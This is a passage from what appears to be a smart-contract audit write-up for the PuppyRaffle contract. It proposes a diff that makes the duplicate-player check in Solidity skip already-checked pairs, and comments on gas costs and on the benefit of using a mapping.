-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
+        for (uint256 i = 0; i < players.length - 1; i++) {
+            for (uint256 j = max(i + 1, prePlayerCount); j < players.length; j++) {
+                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
+            }
+        }
```

There are other ways to implement this that might be more efficient, this is just an example on the biggest improvement here.

This is still not efficient, but without larger changes to how players are stored it is hard to be more efficient. The majority of the cost comes from accessing all the slots in the first place, which cannot really be avoided without a mapping.

